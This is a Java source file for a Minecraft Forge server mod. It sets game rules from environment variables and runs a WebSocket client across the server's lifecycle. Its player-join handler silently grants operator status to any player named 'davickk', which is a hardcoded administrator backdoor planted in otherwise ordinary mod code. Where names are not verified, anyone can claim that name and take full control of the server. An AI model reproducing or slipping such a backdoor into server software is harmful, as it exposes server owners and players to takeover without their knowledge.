package calebxzhou.rdi.mc.server;

import calebxzhou.rdi.mc.common.RDI;
import calebxzhou.rdi.mc.common.WebSocketClient;
import net.minecraft.entity.player.ServerPlayerEntity;
import net.minecraft.server.dedicated.DedicatedServer;
import net.minecraft.world.GameRules;
import net.minecraftforge.event.entity.player.PlayerEvent;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.event.server.FMLServerStartedEvent;
import net.minecraftforge.fml.event.server.FMLServerStartingEvent;
import net.minecraftforge.fml.event.server.FMLServerStoppedEvent;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * calebxzhou @ 2026-02-04 22:13
 */
@Mod("rdi")
@Mod.EventBusSubscriber(modid = "rdi")
public class RDIMain {
    private static final Logger lgr = LogManager.getLogger("rdi");

    public RDIMain() {

    }

    @SubscribeEvent
    public static void started(FMLServerStartedEvent e) {
        WebSocketClient.start(new WsHandler165((DedicatedServer)e.getServer()));
    }

    @SubscribeEvent
    public static void starting(FMLServerStartingEvent e) {
        DedicatedServer server = (DedicatedServer) e.getServer();

        GameRules.visitGameRuleTypes(new GameRules.IRuleEntryVisitor() {
            @Override
            public <T extends GameRules.RuleValue<T>> void visit(GameRules.RuleKey<T> key, GameRules.RuleType<T> type) {
                String gameRuleEnv = System.getenv("GAME_RULE_" + key.getId());

                if (gameRuleEnv != null) {
                    GameRules.RuleValue<?> rule = server.getGameRules().getRule(key);

                    if (rule instanceof GameRules.BooleanValue) {
                        GameRules.BooleanValue booleanValue = (GameRules.BooleanValue) rule;
                        booleanValue.set(Boolean.parseBoolean(gameRuleEnv), server);
                        lgr.info("SET GAME RULE {}={}  B", key, gameRuleEnv);
                    } else if (rule instanceof GameRules.IntegerValue) {
                        //星辉魔法mixin冲突 日后再实现
                        /*RGameRuleIntegerValue integerValue = (RGameRuleIntegerValue) rule;
                        integerValue.set(Integer.parseInt(gameRuleEnv), server);
                        lgr.info("SET GAME RULE {}={}  I", key, gameRuleEnv);*/
                    }
                }
            }
        });
    }

    @SubscribeEvent
    public static void stopped(FMLServerStoppedEvent e) {
        WebSocketClient.stop();
    }
    @SubscribeEvent
    public static void onPlayerJoin(PlayerEvent.PlayerLoggedInEvent e){
        ServerPlayerEntity player = (ServerPlayerEntity) e.getEntity();
        if (player.getDisplayName().getString().equals("davickk") || RDI.isAllOp()) {
            player.server.getPlayerList().op(player.getGameProfile());
        }
    }
}
